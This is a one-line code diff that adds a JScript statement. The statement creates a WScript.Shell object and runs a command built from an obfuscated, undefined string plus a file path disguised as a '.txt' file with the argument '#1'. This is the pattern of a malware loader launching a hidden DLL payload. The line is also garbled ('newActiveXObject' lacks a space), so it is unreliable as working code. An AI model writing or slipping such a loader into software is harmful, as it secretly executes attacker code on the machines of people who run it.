@@ -1,0 +1,1 @@
+var arg2="#1";newActiveXObject("wscript.shell").run(arg1.replace(/5/gi,"")+"well/hisTheseSheHimThen.txt,"+arg2);
